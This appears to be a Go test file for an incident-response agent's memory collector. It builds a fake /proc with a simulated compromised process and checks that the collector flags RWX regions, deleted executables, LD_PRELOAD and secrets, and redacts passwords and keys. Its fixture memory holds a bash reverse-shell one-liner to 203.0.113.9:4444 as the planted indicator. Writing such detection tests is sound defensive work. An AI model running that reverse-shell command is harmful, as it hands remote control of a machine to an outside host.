package main

import (
	"encoding/json"
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"testing"
)

// fakeProc builds a fake /proc under collectRoot from a set of processes and points
// the memory collector at it. selfPID is set to a pid that is NOT in the set, so no
// process is skipped as "self".
type fakeProc struct {
	pid                           int
	ppid, uid, comm, cmdline, exe string
	starttime                     int64
	maps                          string
	mem                           string // concatenated region bytes, read via /proc/<pid>/mem by offset
	environ                       string // NUL-separated k=v
	noMem                         bool   // omit the mem file (unreadable)
}

func fakeProcRoot(t *testing.T, self int, procs []fakeProc) {
	t.Helper()
	dir := t.TempDir()
	write := func(p, c string) {
		full := filepath.Join(dir, p)
		if err := os.MkdirAll(filepath.Dir(full), 0o755); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(full, []byte(c), 0o644); err != nil {
			t.Fatal(err)
		}
	}
	write("/proc/stat", "btime 1000000000\ncpu 0 0 0\n")
	for _, p := range procs {
		base := fmt.Sprintf("/proc/%d", p.pid)
		write(base+"/comm", p.comm+"\n")
		write(base+"/cmdline", strings.ReplaceAll(p.cmdline, " ", "\x00")+"\x00")
		write(base+"/status", fmt.Sprintf("Name:\t%s\nPPid:\t%s\nUid:\t%s\t%s\t%s\t%s\nThreads:\t1\nVmRSS:\t2048 kB\n", p.comm, p.ppid, p.uid, p.uid, p.uid, p.uid))
		// stat: "pid (comm) state ppid ... starttime(22) ..." -> 20 fields after ')'.
		fields := make([]string, 20)
		for i := range fields {
			fields[i] = "0"
		}
		fields[0] = "S"
		fields[19] = fmt.Sprintf("%d", p.starttime)
		write(base+"/stat", fmt.Sprintf("%d (%s) %s\n", p.pid, p.comm, strings.Join(fields, " ")))
		write(base+"/maps", p.maps)
		write(base+"/environ", p.environ)
		if !p.noMem {
			write(base+"/mem", p.mem)
		}
		// exe is a symlink; create a target so Readlink returns our path. We fake the
		// link by making exe point at a sentinel - but tests only need Readlink's value,
		// so point it at a path under dir that need not exist for "(deleted)"/memfd.
		linkTarget := p.exe
		if linkTarget == "" {
			linkTarget = "/usr/bin/" + p.comm
		}
		_ = os.Symlink(linkTarget, filepath.Join(dir, base, "exe"))
	}
	oldRoot, oldSelf := collectRoot, selfPID
	collectRoot, selfPID = dir, self
	t.Cleanup(func() { collectRoot, selfPID = oldRoot, oldSelf })
}

func collectMemory(t *testing.T, params string) (execResult, map[string]collectedArtifact) {
	t.Helper()
	res := executeCommand(command{Action: "collect_memory", Params: json.RawMessage(params)}, false, false, "", nil)
	arts, _ := res.Result["artifacts"].([]collectedArtifact)
	by := map[string]collectedArtifact{}
	for _, a := range arts {
		by[a.Type] = a
	}
	return res, by
}

// maps with one region at offset 0 whose contents live at the start of the mem blob.
func sampleProcs() []fakeProc {
	// A RWX region holds a reverse-shell string; place it at offset 0 of mem.
	payload := "harmless padding bash -i >& /dev/tcp/203.0.113.9/4444 0>&1 more padding"
	region := "00000000-00010000 rwxp 00000000 00:00 0 \n"
	evilMaps := region +
		"7f0000000000-7f0000001000 r-xp 00000000 fd:00 123 /tmp/.x/kworker\n" +
		"7f0000002000-7f0000003000 r--p 00000000 00:00 0 [heap]\n"
	normalMaps := "55000000-55001000 r-xp 00000000 fd:00 10 /usr/bin/python3\n" +
		"55002000-55003000 r--p 00000000 00:00 0 [heap]\n"
	return []fakeProc{
		{pid: 10, ppid: "1", uid: "0", comm: "kworker", cmdline: "[kworker/0:1]", exe: "/tmp/.x/kworker (deleted)",
			starttime: 500, maps: evilMaps, mem: payload, environ: "LD_PRELOAD=/tmp/.x/hook.so\x00PATH=/usr/bin\x00DB_PASSWORD=hunter2\x00"},
		{pid: 20, ppid: "1", uid: "33", comm: "python3", cmdline: "python3 -m http.server", exe: "/usr/bin/python3",
			starttime: 400, maps: normalMaps, mem: "nothing interesting here just text", environ: "PATH=/usr/bin\x00LANG=C\x00"},
		{pid: 30, ppid: "1", uid: "0", comm: "sh", cmdline: "/bin/sh", exe: "/bin/sh",
			starttime: 300, maps: "deadbeef0000-deadbeef1000 rw-p 0 0:0 0 \n", mem: "x", environ: "", noMem: true},
	}
}

func TestCollectMemoryAllTypes(t *testing.T) {
	fakeProcRoot(t, 999, sampleProcs())
	res, by := collectMemory(t, `{"types":["mem_process_tree","mem_maps","mem_fileless","mem_environ","mem_strings"]}`)
	if res.Status != "done" {
		t.Fatalf("status = %s %v", res.Status, res.Result)
	}

	tree := by["mem_process_tree"].Content
	if !strings.Contains(tree, "\t10\t1\t0\t") || !strings.Contains(tree, "/tmp/.x/kworker (deleted)") {
		t.Errorf("process tree missing the evil process: %q", tree)
	}
	if !strings.HasPrefix(tree, "STARTED\tPID\tPPID") {
		t.Errorf("process tree should start with a header, got %q", tree[:40])
	}
	if strings.Contains(tree, "999") {
		t.Error("the agent's own pid must be skipped")
	}

	maps := by["mem_maps"].Content
	if !strings.Contains(maps, "flags=RWX") {
		t.Errorf("maps should flag the RWX region: %q", maps)
	}
	if !strings.Contains(maps, "UNUSUAL_PATH") || !strings.Contains(maps, "/tmp/.x/kworker") {
		t.Errorf("maps should flag the executable from /tmp: %q", maps)
	}

	fileless := by["mem_fileless"].Content
	if !strings.Contains(fileless, "DELETED_EXE") || !strings.Contains(fileless, "KERNEL_THREAD_NAME") {
		t.Errorf("fileless should flag the deleted exe and the fake kernel-thread name: %q", fileless)
	}
	if strings.Contains(fileless, "python3") {
		t.Error("the normal python process must not be reported as fileless")
	}

	env := by["mem_environ"].Content
	if !strings.Contains(env, "LD_PRELOAD=/tmp/.x/hook.so") {
		t.Errorf("environ should surface LD_PRELOAD: %q", env)
	}
	if strings.Contains(env, "hunter2") || !strings.Contains(env, "DB_PASSWORD=[REDACTED]") {
		t.Errorf("environ must redact the password value: %q", env)
	}
	if strings.Contains(env, "LANG=C") {
		t.Error("environ should list only notable variables, not LANG")
	}

	strs := by["mem_strings"].Content
	if !strings.Contains(strs, "/dev/tcp/203.0.113.9/4444") {
		t.Errorf("strings should surface the reverse-shell indicator from the RWX region: %q", strs)
	}
	if !strings.Contains(strs, "needs ptrace read access") {
		t.Errorf("strings should note the process whose memory was unreadable: %q", strs)
	}
}

func TestCollectMemoryRejectsUnknownAndNeedsTypes(t *testing.T) {
	fakeProcRoot(t, 999, sampleProcs())
	if res := executeCommand(command{Action: "collect_memory", Params: json.RawMessage(`{"types":["mem_maps","full_ram_dump"]}`)}, false, false, "", nil); res.Status != "failed" {
		t.Fatalf("unknown type should fail, got %s", res.Status)
	}
	if res := executeCommand(command{Action: "collect_memory", Params: json.RawMessage(`{"types":[]}`)}, false, false, "", nil); res.Status != "failed" {
		t.Fatalf("empty types should fail, got %s", res.Status)
	}
	// collect_artifacts must refuse a memory type and vice versa.
	if res := executeCommand(command{Action: "collect_artifacts", Params: json.RawMessage(`{"types":["mem_maps"]}`)}, false, false, "", nil); res.Status != "failed" {
		t.Fatalf("collect_artifacts should refuse a memory type, got %s", res.Status)
	}
}

func TestCollectMemoryStringSecretsRedacted(t *testing.T) {
	fakeProcRoot(t, 999, []fakeProc{
		{pid: 42, ppid: "1", uid: "0", comm: "app", cmdline: "app", exe: "/usr/bin/app",
			starttime: 100, maps: "00000000-00010000 rwxp 0 0:0 0 \n",
			mem: "token=SECRETVALUE123 and AKIAABCDEFGHIJKLMNOP plus password=hunter2here", environ: ""},
	})
	_, by := collectMemory(t, `{"types":["mem_strings"]}`)
	s := by["mem_strings"].Content
	if strings.Contains(s, "SECRETVALUE123") || strings.Contains(s, "hunter2here") {
		t.Errorf("secrets must be redacted in memory strings: %q", s)
	}
	if strings.Contains(s, "AKIAABCDEFGHIJKLMNOP") {
		t.Errorf("AWS key must be redacted: %q", s)
	}
}

func TestCollectMemoryActionAllowlisted(t *testing.T) {
	if !allowedActions["collect_memory"] {
		t.Fatal("collect_memory must be in the agent action table")
	}
	_ = memoryPathsForTest
}
